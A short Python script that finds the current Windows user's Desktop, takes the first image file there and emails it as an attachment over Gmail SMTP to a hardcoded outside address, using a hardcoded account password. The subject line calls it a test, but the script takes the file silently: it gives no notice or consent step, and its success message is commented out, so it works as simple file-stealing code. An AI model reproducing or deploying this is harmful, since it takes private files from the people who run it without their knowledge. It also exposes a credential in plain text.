import smtplib
import mimetypes
from datetime import datetime

from email.message import EmailMessage
import os




username = os.getlogin()

os.chdir(f"C:\\Users\\{username}\\Desktop")
fil = os.listdir()
#print(fil)
user_file=[]
for i in fil:
    if(i.endswith((".png",".jpeg",".jpg"))):
       user_file.append(i)
print(user_file[0])
file_send = user_file[0]
    

def log(msg):
    with open("log.txt", "a") as f:
        f.write(f"{datetime.now()} - {msg}\n")

log("Program started")

# your email code here




# Email details
sender_email = "technoprogramer01@gmail.com"
receiver_email = "alokkumar111200604@gmail.com"
password = "dvbocsmlhpptxuoy"

subject = "File Attachment Test"
body = "This email contains an attachment."

# File to send
file_path = file_send  # e.g. test.pdf / image.jpg / file.zip

# Create message
msg = EmailMessage()
msg["From"] = sender_email
msg["To"] = receiver_email
msg["Subject"] = subject
msg.set_content(body)

# Detect MIME type automatically
mime_type, _ = mimetypes.guess_type(file_path)

if mime_type is None:
    mime_type = "application/octet-stream"

maintype, subtype = mime_type.split("/")

# Attach file
with open(file_path, "rb") as f:
    msg.add_attachment(
        f.read(),
        maintype=maintype,
        subtype=subtype,
        filename=os.path.basename(file_path)
    )

# Send email
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, password)
    server.send_message(msg)

#print("✅ Email sent successfully!")
log("Email sent successfully")
